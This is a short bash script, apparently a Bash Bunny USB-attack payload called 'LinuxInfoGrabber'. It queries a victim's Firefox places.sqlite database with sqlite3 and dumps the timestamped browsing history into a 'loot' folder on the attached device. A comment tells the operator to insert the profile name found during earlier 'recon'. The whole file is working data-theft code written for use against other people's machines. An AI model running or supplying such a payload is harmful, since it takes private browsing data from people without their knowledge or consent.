#!/bin/bash
#
#
# runs browser history harvester
#

LOOTDIR=/run/media/$USER/BashBunny/loot/LinuxInfoGrabber

# change this to whatever the filename is that was found in recon ex.) w4wcp85s.default
BROWSERCREDS="i715z2e3.default"

sqlite3 ~/.mozilla/firefox/$BROWSERCREDS/places.sqlite "SELECT datetime(a.visit_date/1000000, 'unixepoch') AS visit_date, b.url FROM moz_historyvisits AS a JOIN moz_places AS b ON a.place_id=b.id WHERE 1 ORDER BY a.visit_date ASC;" > $LOOTDIR/browserhistory.txt 
